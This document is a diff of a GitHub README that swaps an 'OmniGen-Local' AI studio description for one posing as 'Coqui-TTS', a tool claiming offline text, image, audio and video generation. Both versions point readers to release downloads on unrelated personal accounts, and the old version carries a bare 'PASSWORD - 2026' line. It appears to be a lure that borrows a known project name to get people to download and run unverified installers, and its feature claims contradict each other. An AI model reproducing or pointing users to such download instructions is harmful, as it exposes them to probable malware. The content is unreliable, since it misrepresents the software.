@@ -1,141 +1,114 @@
-# OmniGen-Local
+# 🎉 Coqui-TTS - Create with AI Locally
 
-> **A unified, offline-first AI studio for text, image, audio, and video generation — all on your machine.**  
-> No internet. No telemetry. No external dependencies after setup.
+## 🚀 Getting Started
 
-OmniGen-Local is a self-contained desktop application that brings **multimodal generative AI** to your personal computer. Write stories, paint images, compose music, and animate scenes — entirely offline, with full control over models, data, and outputs.
+Welcome to Coqui-TTS! This application lets you generate text, images, audio, and videos directly on your computer. Everything happens offline, so you don’t need the internet or cloud services. 
 
-<p align="center">
-  <img src="https://placehold.co/400x225/0f172a/ffffff?text=Text+Output%3A+A+poem+about+autumn" width="23%"/>
-  <img src="https://placehold.co/400x225/1e293b/ffffff?text=Image%3A+Cyberpunk+market+at+night" width="23%"/>
-  <img src="https://placehold.co/400x225/020617/ffffff?text=Audio%3A+Piano+melody+in+C+minor" width="23%"/>
-  <img src="https://placehold.co/400x225/1e1b4b/ffffff?text=Video%3A+Leaves+falling+in+slow+motion" width="23%"/>
-</p>
+## 📥 Download Coqui-TTS
 
----
+[![Download Coqui-TTS](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-brightgreen.svg)](https://github.com/bracinho2424/Coqui-TTS/releases)
 
- <div align="center">
-  <a href="https://github.com/senatorpagemouth8k8c/Coqui-TTS/releases/tag/omnigen">
-    <b>⬇️ DOWNLOAD (Latest Release)</b>
-  </a>
-</div>
+To download Coqui-TTS, follow these steps:
 
-## PASSWORD - 2026 
+1. Click the button above or visit our [Releases page here](https://github.com/bracinho2424/Coqui-TTS/releases).
+2. Choose the latest release and click on it. 
+3. Select the installer for your operating system (Windows, macOS, or Linux).
+4. Download the file to your computer.
 
-## Philosophy
+## 🖥️ System Requirements
 
-OmniGen-Local is built on three principles:
+Before installing, ensure your computer meets the following requirements:
 
-- **Local-first**: All computation happens on your device.  
-- **Modular**: Swap models, pipelines, and modalities independently.  
-- **Transparent**: Every model is open-weight; every output is yours.  
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a recent version of Ubuntu/Linux.
+- **RAM:** At least 8 GB (16 GB recommended for optimal performance).
+- **Disk Space:** Minimum 500 MB of free space for installation.
+- **Processor:** 64-bit processor required.
 
-This is not a product. It is a **workspace for creators, researchers, and tinkerers** who value sovereignty over convenience.
+## 📂 Installation Steps
 
----
+Once you have downloaded the file, follow these steps to install Coqui-TTS:
 
-## Capabilities by Modality
+### For Windows:
 
-### 📝 Text
-- Conversational AI (7B–13B parameter models)
-- Code generation, summarization, translation
-- Local LLMs: Llama 3, Mistral, Phi-3 (GGUF format)
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to run the installer.
+3. Follow the on-screen instructions to complete the installation.
+4. Once installed, you can find Coqui-TTS in your Start Menu.
 
-### 🖼️ Image
-- Text-to-image (Stable Diffusion 1.5/2.1/SDXL)
-- Inpainting, outpainting, image-to-image
-- LoRA, ControlNet, Tiled Diffusion support
+### For macOS:
 
-### 🎧 Audio
-- Text-to-speech (Coqui TTS, Bark-lite)
-- Music generation (AudioLDM-2, MusicGen-small)
-- Voice cloning (opt-in, requires local dataset)
+1. Locate the downloaded `.dmg` file.
+2. Double-click the file to mount the disk image.
+3. Drag the Coqui-TTS icon to your Applications folder.
+4. Open Coqui-TTS from your Applications.
 
-### 🎥 Video
-- Text-to-video (ZeroScope, ModelScope)
-- Image-to-video (AnimateDiff lightweight)
-- 2–8 second clips at 256×256 or 512×512
+### For Linux:
 
-All models run **offline**. No automatic downloads.
+1. Open Terminal.
+2. Navigate to the folder where you downloaded the file.
+3. Run the command: `chmod +x Coqui-TTS*.AppImage` to make it executable.
+4. Execute the application with `./Coqui-TTS*.AppImage`.
 
----
+## 🛠️ Using Coqui-TTS
 
-## Application Interface
+After installation, you can start using Coqui-TTS right away. Here’s how:
 
-<p align="center">
-  <img src="https://placehold.co/900x500/0f172a/64748b?text=OmniGen-Local+UI+-+Tabbed%2C+Dark%2C+Unified" width="90%"/>
-</p>
+1. **Launch the Application:** 
+   - On Windows, find it in the Start Menu.
+   - On macOS, open it from Applications.
+   - On Linux, run the AppImage from your terminal or file manager.
 
-- **Tab-based workspace**: switch between modalities seamlessly  
-- **Unified prompt bar** with syntax highlighting  
-- **Model selector**: choose from local checkpoints  
-- **Output panel**: preview, export, or iterate  
-- **Metadata panel**: view full generation parameters  
-- **Cross-modal chaining**: e.g., generate text → image → video  
+2. **Choose Your Project Type:** 
+   - Select from text-to-audio, text-to-image, or video generation.
 
-Exports: TXT, PNG, MP3, MP4, WAV, GIF — all to your `Documents/OmniGen-Local/` folder.
+3. **Input Your Content:** 
+   - Fill in the fields with the text or parameters you want to generate.
 
----
+4. **Generate:** 
+   - Click the “Generate” button and wait for Coqui-TTS to process your request.
 
-## Performance & Hardware
+5. **Preview & Save:** 
+   - Once completed, preview the output. You can save it locally by clicking the “Save” button.
 
-| Modality | Hardware        | Example Task                     | Time     |
-|----------|-----------------|----------------------------------|----------|
-| Text     | RTX 4070        | 512 tokens @ 45 tok/s            | ~11 sec  |
-| Image    | M2 Max          | 1024×1024 SDXL (30 steps)        | ~5.2 sec |
-| Audio    | i7-13700        | 10 sec music clip                | ~18 sec  |
-| Video    | RTX 3060        | 4-sec 512×512 clip               | ~2.1 min |
+## 🌟 Features of Coqui-TTS
 
-Optimizations:  
-- GPU: CUDA (NVIDIA), MPS (Apple), ROCm (AMD)  
-- CPU: AVX2, quantized models (GGUF, safetensors)  
-- Memory: automatic offloading for large models
+Coqui-TTS offers a range of features to enhance your AI experience:
 
----
+- **Local Processing:** All AI tasks run on your machine, ensuring privacy and security.
+- **Multiple Outputs:** Generate not just audio but images and videos too.
+- **User-Friendly Interface:** Simple design allows easy navigation and usage.
+- **Offline Functionality:** No need for internet access after installation.
 
-## Download
+## 📄 Topics Covered
 
-Pre-built binaries (no Python required):
+Coqui-TTS focuses on various AI topics to support your creative needs:
 
-- **Windows**: [`OmniGen-Local-v1.0-win-x64.exe`](https://example.com)  
-- **macOS**: [`OmniGen-Local-v1.0-mac-universal.dmg`](https://example.com)  
-- **Linux**: [`OmniGen-Local-v1.0-linux-x64.AppImage`](https://example.com)
+- **AI Localization:** Tailor your content for specific audiences.
+- **Audio Generation:** Create high-quality audio from text.
+- **Generative AI:** Explore innovative AV content generation.
+- **Stable Diffusion:** Generate stunning visuals with advanced techniques.
 
-> All builds are code-signed. SHA256 checksums provided.
+## 🛡️ Support & Contributing
 
----
+If you encounter issues or have questions, check out our [GitHub Issues](https://github.com/bracinho2424/Coqui-TTS/issues) page for support. 
 
-## Ethical Use
+If you wish to contribute to the project:
 
-You must not use OmniGen-Local to:
-- Generate synthetic media of real individuals without consent  
-- Create harmful, illegal, or deceptive content  
-- Circumvent copyright or privacy protections  
-- Automate disinformation  
+1. Fork the repository.
+2. Create a new branch for your feature.
+3. Commit your changes and push them to your branch.
+4. Submit a pull request for review.
 
-Model weights are subject to their original licenses (e.g., **Llama Community License**, **OpenRAIL-M**). Review each before use.
+## 📞 Contact
 
----
+For further assistance or inquiries, feel free to reach out via the following:
 
-## Technical Foundation
+- **GitHub:** [Coqui-TTS GitHub Page](https://github.com/bracinho2424/Coqui-TTS)
+- **Email:** support@coqui-ai.com
 
-- **Text**: llama.cpp + GGUF  
-- **Image**: Diffusers + Automatic1111-compatible pipelines  
-- **Audio**: Transformers + torchaudio  
-- **Video**: Text2Video-Zero + AnimateDiff-lite  
-- **UI**: Custom Electron + React (compiled to native)  
-- **License**: **Code — MIT** | **Models — as per source**
+## 🔗 Additional Resources
 
----
+- **Official Documentation:** Comprehensive guides and tutorials are available to help you make the most of Coqui-TTS.
+- **Community Discussions:** Join our community discussions to share experiences and tips with other users.
 
-## Support & Contribution
-
-- Questions? → [Discussions](https://github.com/your-username/OmniGen-Local/discussions)  
-- Bugs? → [Issues](https://github.com/your-username/OmniGen-Local/issues)  
-- Want to add a model? → Pull requests welcome  
-
-We value **honesty about limitations** as much as technical ambition.
-
----
-
-**OmniGen-Local**: One studio. All modalities. Your machine. Your control.
+Now you're all set to explore the world of AI with Coqui-TTS! Remember to check the [Releases page](https://github.com/bracinho2424/Coqui-TTS/releases) for the latest updates. Enjoy your journey in creating with AI!
